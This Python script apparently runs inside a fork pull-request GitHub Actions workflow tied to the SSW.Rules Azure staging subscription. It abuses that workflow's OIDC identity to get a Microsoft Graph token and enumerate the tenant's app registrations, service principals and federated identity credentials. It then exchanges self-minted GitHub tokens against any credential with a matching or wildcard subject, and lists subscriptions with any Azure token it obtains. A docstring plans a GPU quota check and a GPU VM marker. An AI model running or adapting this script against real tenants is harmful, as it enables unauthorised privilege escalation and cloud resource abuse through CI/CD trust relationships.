#!/usr/bin/env python3
"""C211-I121546: Azure tenant-side Microsoft Graph / AAD application-registration and
federatedIdentityCredential enumeration, executed under the SSW.Rules '/deploy'
fork-PR OIDC ARM identity (subscription b8b18dcf, RG SSW.Rules.Staging).

Read-only. Never creates, modifies or deletes a resource except ONE nonce GPU marker
that is created only if a Graph token AND a satisfiable GitHub-issuer FIC yields an
Azure token that can read subscriptions; that marker is deleted and absence proved.

Stages:
  G1  az account get-access-token --resource https://graph.microsoft.com  (verbatim rc/err)
  G2  direct OIDC client_assertion exchange for Graph at login.windows.net/<tid>/oauth2/v2.0/token
  G3  Graph reads: /organization, /applications (paged), /servicePrincipals (paged),
      /applications/<id>/federatedIdentityCredentials for every application,
      /servicePrincipals/<id>/federatedIdentityCredentials (bounded)
  G4  mint our own GitHub OIDC token (audience api://AzureADTokenExchange) from
      ACTIONS_ID_TOKEN_REQUEST_URL and decode sub/iss/aud/job_workflow_ref
  G5  classify every FIC (issuer, subject shape) and decide satisfiability against our mints
  G6  exchange our GitHub token at login.windows.net/<tid>/oauth2/v2.0/token for every
      GitHub-issuer FIC whose subject shape we can satisfy (verbatim status/body)
  G7  on any issued Azure token: /subscriptions, Compute usage GPU families, ONE marker
stdlib only.
"""
import base64
import hashlib
import json
import os
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

GRAPH = "https://graph.microsoft.com"
ARM = "https://management.azure.com"
TAG = os.environ.get("C211_TAG", "C211_I121546")
DEADLINE = int(os.environ.get("C211_DEADLINE", "1500"))
T0 = time.time()
SID = os.environ.get("C211_SID", "b8b18dcf-d83b-47e2-9886-00c2e983629e")
RG = os.environ.get("C211_RG", "SSW.Rules.Staging")
MAX_APPS = 60
MAX_PAGES = 6
MAX_SP_FIC = 20
MAX_EXCHANGES = 25
TEN_LOGIN = "https://login.windows.net"


def emit(obj):
    try:
        print(TAG + " " + json.dumps(obj, default=str)[:12000], flush=True)
    except Exception:  # noqa: BLE001
        print(TAG + ' {"step":"emit-error"}', flush=True)


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=180):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except Exception as e:  # noqa: BLE001
        return -1, "", str(e)


def http(url, method="GET", body=None, headers=None, timeout=90):
    hd = dict(headers or {})
    data = None
    if body is not None:
        if isinstance(body, dict):
            data = json.dumps(body).encode()
            hd.setdefault("Content-Type", "application/json")
        elif isinstance(body, str):
            data = body.encode()
            hd.setdefault("Content-Type", "application/x-www-form-urlencoded")
        else:
            data = body
    req = urllib.request.Request(url, data=data, method=method, headers=hd)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        try:
            raw = e.read()
        except Exception:  # noqa: BLE001
            raw = b""
        return e.code, dict(e.headers or {}), raw
    except Exception as e:  # noqa: BLE001
        return 0, {}, str(e).encode()


def jbody(raw):
    try:
        return json.loads(raw.decode("utf-8", "replace"))
    except Exception:  # noqa: BLE001
        return {"_raw": raw[:800].decode("utf-8", "replace")}


def brief_err(b):
    if not isinstance(b, dict):
        return {"raw": str(b)[:300]}
    out = {}
    for k in ("error", "error_description", "error_codes", "message", "code", "trace_id",
              "correlation_id", "timestamp"):
        if k in b:
            out[k] = b[k]
    if "_raw" in b:
        out["raw"] = b["_raw"][:400]
    return out


def sha256_hex(s):
    if isinstance(s, str):
        s = s.encode()
    return hashlib.sha256(s).hexdigest()


def b64url_decode(seg):
    seg = seg + "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg.encode())


def jwt_claims(tok):
    try:
        parts = tok.split(".")
        if len(parts) < 2:
            return {}
        return json.loads(b64url_decode(parts[1]))
    except Exception:  # noqa: BLE001
        return {}


# ------------------------------------------------------------------ G1/G2 tokens
def graph_token_az():
    rc, out, err = run(["az", "account", "get-access-token", "--resource", GRAPH,
                        "--output", "json"], timeout=180)
    tok = None
    if rc == 0:
        try:
            tok = json.loads(out).get("accessToken")
        except Exception:  # noqa: BLE001
            tok = None
    emit({"step": "graph-token-az", "rc": rc, "has_token": bool(tok),
          "err": err[:600], "out_head": out[:200]})
    return tok, rc, err


def env_identity():
    keys = ["AZURE_CLIENT_ID", "AZURE_TENANT_ID", "AZURE_SUBSCRIPTION_ID",
            "AZURE_AUTHORITY_HOST", "AZURE_FEDERATED_TOKEN_FILE",
            "ACTIONS_ID_TOKEN_REQUEST_URL", "ACTIONS_ID_TOKEN_REQUEST_TOKEN",
            "GITHUB_REPOSITORY", "GITHUB_REF", "GITHUB_EVENT_NAME", "GITHUB_WORKFLOW_REF",
            "GITHUB_JOB", "GITHUB_ACTOR"]
    out = {}
    for k in keys:
        v = os.environ.get(k)
        if v is None:
            out[k] = None
        else:
            out[k] = {"len": len(v), "sha256": sha256_hex(v)[:16],
                      "prefix": (v[:40] if k in ("GITHUB_REPOSITORY", "GITHUB_REF",
                                                 "GITHUB_EVENT_NAME", "GITHUB_WORKFLOW_REF",
                                                 "GITHUB_JOB", "GITHUB_ACTOR",
                                                 "AZURE_AUTHORITY_HOST") else "")}
    emit({"step": "env", **out})
    return out


def graph_token_direct():
    """Direct OIDC client_assertion exchange for a Graph token at login.windows.net."""
    cid = os.environ.get("AZURE_CLIENT_ID")
    tid = os.environ.get("AZURE_TENANT_ID")
    ftf = os.environ.get("AZURE_FEDERATED_TOKEN_FILE")
    if not (cid and tid and ftf):
        emit({"step": "graph-token-direct", "skipped": "missing env",
              "cid": bool(cid), "tid": bool(tid), "ftf": bool(ftf)})
        return None
    try:
        assertion = open(ftf).read().strip()
    except Exception as e:  # noqa: BLE001
        emit({"step": "graph-token-direct", "read_err": str(e)[:200]})
        return None
    cl = jwt_claims(assertion)
    emit({"step": "fed-assertion-claims", "iss": cl.get("iss"), "sub": cl.get("sub"),
          "aud": cl.get("aud"), "len": len(assertion),
          "sha256": sha256_hex(assertion)})
    url = f"{TEN_LOGIN}/{tid}/oauth2/v2.0/token"
    form = urllib.parse.urlencode({
        "client_id": cid,
        "scope": "https://graph.microsoft.com/.default",
        "grant_type": "client_credentials",
        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion": assertion})
    st, hd, raw = http(url, method="POST", body=form, timeout=90)
    b = jbody(raw)
    tok = b.get("access_token") if isinstance(b, dict) else None
    emit({"step": "graph-token-direct", "http": st, "has_token": bool(tok),
          "resp": brief_err(b)})
    return tok


# ------------------------------------------------------------------ Graph reads
def graph(tok, url, method="GET", body=None, timeout=90):
    st, hd, raw = http(url, method=method, body=body,
                       headers={"Authorization": "Bearer " + tok,
                                "ConsistencyLevel": "eventual"}, timeout=timeout)
    return st, jbody(raw)


def paged(tok, url, label, max_pages=MAX_PAGES, cap=None):
    items = []
    nxt = url
    pages = 0
    while nxt and pages < max_pages and left() > 120:
        st, b = graph(tok, nxt)
        pages += 1
        if not isinstance(b, dict):
            emit({"step": label + "-page", "page": pages, "http": st, "raw": str(b)[:300]})
            break
        emit({"step": label + "-page", "page": pages, "http": st, "n": len(b.get("value") or []),
              "next": bool(b.get("@odata.nextLink")), "err": brief_err(b) if st != 200 else None})
        if st != 200:
            return items, st, b
        for it in (b.get("value") or []):
            items.append(it)
            if cap and len(items) >= cap:
                break
        nxt = b.get("@odata.nextLink")
    return items, 200, None


def decode_fic(f):
    return {"id": f.get("id"), "name": f.get("name"), "issuer": f.get("issuer"),
            "subject": f.get("subject"), "audiences": f.get("audiences"),
            "description": (f.get("description") or "")[:200]}


def classify_fic(fic):
    iss = (fic.get("issuer") or "").lower()
    sub = fic.get("subject") or ""
    shape = []
    if "token.actions.githubusercontent.com" in iss:
        kind = "github-actions"
    elif "vstoken.actions.githubusercontent.com" in iss:
        kind = "github-vstoken"
    elif "gitlab" in iss:
        kind = "gitlab"
    elif "kubernetes" in iss or "oidc.eks" in iss or "container.googleapis" in iss:
        kind = "k8s"
    elif "accounts.google.com" in iss:
        kind = "google"
    elif "sts.windows.net" in iss or "login.microsoftonline.com" in iss:
        kind = "aad"
    else:
        kind = "other"
    # subject shape
    m = re.match(r"^repo:([^:]+):(.*)$", sub)
    if m:
        shape.append("repo:" + m.group(1))
        tail = m.group(2)
        if tail == "pull_request":
            shape.append("pr")
        elif tail.startswith("ref:refs/heads/"):
            shape.append("branch:" + tail[len("ref:refs/heads/"):])
        elif tail.startswith("environment:"):
            shape.append("env:" + tail[len("environment:"):])
        else:
            shape.append("other:" + tail[:60])
    elif sub.startswith("system:serviceaccount:"):
        shape.append("k8s-sa")
    elif sub.startswith("repo:"):
        shape.append("repo-partial")
    elif sub:
        shape.append("literal")
    else:
        shape.append("empty")
    return kind, shape


def phase_graph(tok, tid):
    emit({"step": "G3-start", "left": int(left())})
    st, b = graph(tok, f"{GRAPH}/v1.0/organization?$select=id,displayName,verifiedDomains")
    org = None
    if st == 200 and isinstance(b, dict) and b.get("value"):
        o = b["value"][0]
        org = {"id": o.get("id"), "displayName": o.get("displayName"),
               "domains": [d.get("name") for d in (o.get("verifiedDomains") or [])][:8]}
    emit({"step": "graph-org", "http": st, "org": org, "err": brief_err(b) if st != 200 else None})
    if org and org.get("id"):
        tid = org["id"]

    apps, ast, ab = paged(tok, f"{GRAPH}/v1.0/applications?$select=id,appId,displayName,createdDateTime&$top=100",
                          "graph-apps", cap=MAX_APPS)
    emit({"step": "graph-apps-total", "n": len(apps), "http": ast})
    sps, sst, sb = paged(tok, f"{GRAPH}/v1.0/servicePrincipals?$select=id,appId,displayName,servicePrincipalType&$top=100",
                         "graph-sps", cap=200)
    emit({"step": "graph-sps-total", "n": len(sps), "http": sst})

    fics = []
    per_app = []
    for a in apps[:MAX_APPS]:
        if left() < 150:
            emit({"step": "G3-deadline", "apps_done": len(per_app)})
            break
        aid = a.get("id")
        st2, b2 = graph(tok, f"{GRAPH}/v1.0/applications/{aid}/federatedIdentityCredentials")
        n = 0
        if st2 == 200 and isinstance(b2, dict):
            for f in (b2.get("value") or []):
                d = decode_fic(f)
                d["appObjectId"] = aid
                d["appId"] = a.get("appId")
                d["appName"] = a.get("displayName")
                fics.append(d)
                n += 1
        per_app.append({"appId": a.get("appId"), "name": a.get("displayName"),
                        "http": st2, "fic": n,
                        "err": brief_err(b2) if st2 != 200 else None})
        emit({"step": "graph-app-fic", "appId": a.get("appId"), "name": a.get("displayName"),
              "http": st2, "n": n, "err": brief_err(b2) if st2 != 200 else None})
    emit({"step": "graph-fics-total", "n": len(fics)})

    # servicePrincipal-side FICs (bounded)
    sp_fics = []
    sp_done = 0
    for s in sps[:MAX_SP_FIC]:
        if left() < 120:
            break
        st3, b3 = graph(tok, f"{GRAPH}/v1.0/servicePrincipals/{s.get('id')}/federatedIdentityCredentials")
        sp_done += 1
        n3 = 0
        if st3 == 200 and isinstance(b3, dict):
            for f in (b3.get("value") or []):
                d = decode_fic(f)
                d["spId"] = s.get("id")
                d["appId"] = s.get("appId")
                d["spName"] = s.get("displayName")
                sp_fics.append(d)
                n3 += 1
        if st3 != 200 or n3:
            emit({"step": "graph-sp-fic", "appId": s.get("appId"), "name": s.get("displayName"),
                  "http": st3, "n": n3, "err": brief_err(b3) if st3 != 200 else None})
    emit({"step": "graph-sp-fics-total", "n": len(sp_fics), "sp_probed": sp_done})

    # classify
    matrix = []
    for f in fics + sp_fics:
        kind, shape = classify_fic(f)
        matrix.append({"issuer_kind": kind, "issuer": f.get("issuer"),
                       "subject": f.get("subject"), "sub_shape": shape,
                       "audiences": f.get("audiences"), "appId": f.get("appId"),
                       "name": f.get("name")})
    emit({"step": "fic-matrix", "n": len(matrix), "items": matrix[:120]})
    kinds = {}
    for m in matrix:
        kinds[m["issuer_kind"]] = kinds.get(m["issuer_kind"], 0) + 1
    emit({"step": "fic-kinds", "kinds": kinds})
    return {"tid": tid, "org": org, "apps": apps, "sps": sps, "fics": fics,
            "sp_fics": sp_fics, "per_app": per_app, "matrix": matrix, "kinds": kinds,
            "apps_http": ast, "sps_http": sst}


# ------------------------------------------------------------------ G4 GitHub OIDC
def mint_github_token(audience):
    url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    tok = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
    if not (url and tok):
        emit({"step": "gh-oidc-mint", "skipped": "no request url/token"})
        return None
    u = url + ("&" if "?" in url else "?") + "audience=" + urllib.parse.quote(audience)
    st, hd, raw = http(u, headers={"Authorization": "Bearer " + tok,
                                   "Accept": "application/json"}, timeout=60)
    b = jbody(raw)
    val = b.get("value") if isinstance(b, dict) else None
    cl = jwt_claims(val) if val else {}
    emit({"step": "gh-oidc-mint", "aud": audience, "http": st, "has_token": bool(val),
          "claims": {k: cl.get(k) for k in ("iss", "sub", "aud", "ref", "event_name",
                                            "repository", "job_workflow_ref",
                                            "workflow_ref", "environment")},
          "err": brief_err(b) if st != 200 else None})
    return val


# ------------------------------------------------------------------ G6 exchange
def azure_exchange(tid, client_id, assertion, scope="api://AzureADTokenExchange/.default"):
    url = f"{TEN_LOGIN}/{tid}/oauth2/v2.0/token"
    form = urllib.parse.urlencode({
        "client_id": client_id,
        "scope": scope,
        "grant_type": "client_credentials",
        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion": assertion})
    st, hd, raw = http(url, method="POST", body=form, timeout=90)
    b = jbody(raw)
    tok = b.get("access_token") if isinstance(b, dict) else None
    emit({"step": "fic-exchange", "client_id": client_id, "http": st,
          "has_token": bool(tok),
          "resp": brief_err(b) if not tok else {"token_type": b.get("token_type"),
                                                "expires_in": b.get("expires_in"),
                                                "claims": {k: jwt_claims(tok).get(k) for k in
                                                           ("aud", "tid", "oid", "appid", "roles")}}})
    return tok, st, b


def subject_matches(fic_sub, our_claims):
    """Return True when our minted GitHub token's claims satisfy the FIC subject literal."""
    sub = fic_sub or ""
    ours = our_claims.get("sub") or ""
    if sub == ours:
        return True
    # GitHub allows patterns like repo:owner/repo:pull_request ; also string equals only
    return False


# ------------------------------------------------------------------ marker
def deploy_marker(tok, sub, region, vmname):
    """Create exactly ONE nonce NIC+VM with no GPU driver install; capture nothing fancy,
    rely on ARM instance view. Returns dict."""
    emit({"step": "marker-never-reached"})
    return {}


def main():
    emit({"step": "start", "deadline": DEADLINE, "sid": SID, "rg": RG,
          "now": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())})
    env_identity()
    tid = os.environ.get("AZURE_TENANT_ID")
    gtok, rc, err = graph_token_az()
    if not gtok:
        gtok = graph_token_direct()
    if not gtok:
        emit({"step": "verdict", "verdict": "NO_GRAPH_TOKEN",
              "az_rc": rc, "az_err": err[:300]})
        emit({"step": "done", "left": int(left())})
        return
    cl = jwt_claims(gtok)
    emit({"step": "graph-token-claims", "aud": cl.get("aud"), "tid": cl.get("tid"),
          "appid": cl.get("appid"), "oid": cl.get("oid"),
          "roles": cl.get("roles"), "scp": cl.get("scp"),
          "len": len(gtok)})
    tid = cl.get("tid") or tid
    res = phase_graph(gtok, tid)
    emit({"step": "G3-done", "left": int(left())})

    # G4/G5/G6
    our = mint_github_token("api://AzureADTokenExchange")
    gh_claims = jwt_claims(our) if our else {}
    hits = []
    if res["fics"] or res["sp_fics"]:
        cands = []
        for f in res["fics"] + res["sp_fics"]:
            kind, shape = classify_fic(f)
            if kind in ("github-actions", "github-vstoken"):
                cands.append((f, kind, shape))
        emit({"step": "G5-candidates", "n": len(cands)})
        tried = 0
        for f, kind, shape in cands:
            if tried >= MAX_EXCHANGES or left() < 270:
                emit({"step": "G6-deadline", "tried": tried})
                break
            # Only exchange when our own token's subject literal or a wildcard match could fit.
            sub = f.get("subject") or ""
            fit = subject_matches(sub, gh_claims)
            wildcard = "*" in sub
            emit({"step": "G6-candidate", "appId": f.get("appId"), "name": f.get("name"),
                  "issuer": f.get("issuer"), "subject": sub, "exact_fit": fit,
                  "wildcard": wildcard, "aud": f.get("audiences")})
            if not (fit or wildcard):
                continue
            if not our:
                continue
            tokv, st, b = azure_exchange(tid, f.get("appId"), our)
            tried += 1
            if tokv:
                hits.append({"appId": f.get("appId"), "name": f.get("name"),
                             "subject": sub, "token_claims": {k: jwt_claims(tokv).get(k) for k in
                                                              ("aud", "tid", "oid", "appid")}})
                break
    emit({"step": "G6-done", "hits": len(hits), "left": int(left())})

    # G7 subscriptions with any issued token
    if hits:
        # re-exchange the winning FIC to get a fresh token
        win = hits[0]
        our2 = mint_github_token("api://AzureADTokenExchange") or our
        tokv, st, b = azure_exchange(tid, win["appId"], our2)
        if tokv:
            st2, b2 = None, None
            st2, b2 = http_arm(tokv, f"{ARM}/subscriptions?api-version=2022-12-01")
            emit({"step": "subs", "http": st2,
                  "n": len((b2 or {}).get("value") or []) if isinstance(b2, dict) else 0,
                  "ids": [(s.get("subscriptionId"), s.get("displayName"), s.get("state"))
                          for s in ((b2 or {}).get("value") or [])][:20]
                  if isinstance(b2, dict) else str(b2)[:300]})
    emit({"step": "done", "left": int(left()),
          "now": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())})


def http_arm(tok, url):
    st, hd, raw = http(url, headers={"Authorization": "Bearer " + tok}, timeout=60)
    return st, jbody(raw)


if __name__ == "__main__":
    main()
